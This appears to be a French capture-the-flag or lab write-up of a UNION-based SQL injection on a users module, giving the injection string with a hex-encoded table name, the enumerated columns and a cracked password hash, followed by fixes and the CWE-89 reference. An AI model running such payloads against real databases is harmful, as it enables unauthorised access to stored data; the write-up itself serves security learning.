## Vulnérabilité : SQL Injection (UNION-based sur module users)

```
5 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 0x7573657273 --

0x7573657273 = users

user_id
first_name
last_name
town
country
planet
Commentaire --> Decrypt this password -> then lower all the char.   Sh256 on it and it's good !
countersign --> 5ff9d0165b4f92b14994e5c685cdce28

5ff9d0165b4f92b14994e5c685cdce28 --> FortyTwo
```

### Ce que ça implique / pourquoi c’est dangereux
L’attaque utilise une injection SQL avec `UNION SELECT` pour interroger la table `users` (nom encodé en hexadécimal afin de contourner des filtres simples).

L’attaquant peut ainsi :

- Lister les colonnes via `information_schema`
- Lire le contenu des tables
- Récupérer des hashes stockés
- Exploiter des messages internes pour résoudre des défis ou accéder à d’autres zones

Cela montre un **accès non autorisé complet aux données** de la base.

### Comment la corriger
- Utiliser uniquement des **requêtes préparées**
- Valider strictement le type des paramètres (ex : ID numérique)
- Ne jamais concaténer les entrées utilisateur
- Limiter les privilèges du compte SQL
- Masquer les messages d’erreur en production

### Type de CWE
- **CWE-89** — SQL Injection
